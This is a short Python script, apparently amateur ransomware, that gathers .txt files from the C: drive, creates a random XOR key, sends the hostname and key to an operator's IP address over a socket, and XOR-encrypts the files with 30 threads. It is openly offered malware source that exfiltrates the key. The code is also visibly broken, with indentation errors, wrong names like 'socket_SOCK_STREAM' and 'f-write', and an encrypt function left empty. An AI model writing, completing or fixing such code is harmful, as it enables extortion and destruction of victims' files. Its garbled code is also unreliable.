#this is made by soneon 

from ipaddress import ip_address
from operator import index
import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import queue

# safeguard password
safeguard = input("please enter safeguard password")
if safeguard != 'start':
    quit()

# file exstention to encrypt
encrypted_ext = ('.txt')

# Grab all files from the machine
 file_paths = []
 for root, dirs, files in os.walk('c:\\'):
     for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)

#generate key
key = ''
encryption_level = 128 // 8
char_pool = ''
for i in range(0x00, 0xFF):
    char_pool += (chr(i))
for i in range(encryption_level):
    key += random.choice(char_pool)

hostname = os.getenv('COMPUTERNAME')

#connnect to the main ranomware server and key
ip_address = ''       #put you own ip adres becaus the computer is the server
port = 5678
time = datetime.now()
with socket.socket(socket.AF_INET, socket_SOCK_STREAM) as s:
    s.connect((ip_address, port))
    s.send(f'[{time}] - {hostname}:{key}'.encode('utf-8'))

#encrypt files
def encrypt(key):
    pass
while q.not_empty:
    file = q.get()
    max_index = encryption_level -1
    try:
        with open(file, 'rb') as f:
            data = f.read()
        with open(file, 'ab')  as f: 
            for byte in data:
             xor_byte = byte ^ord(key[index])
             f-write(xor_byte.to_bytes(1, 'little'))
             if index >= max_index:
                index = 0
             else:
                index += 1   
    except:
        print(f'failed to encrypt {file}')
    q.task.done()



q = queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = thread(target=encrypt, args=(key,) deanon=True)
    thread.start()


q.join()
print('encryption was succesfull')
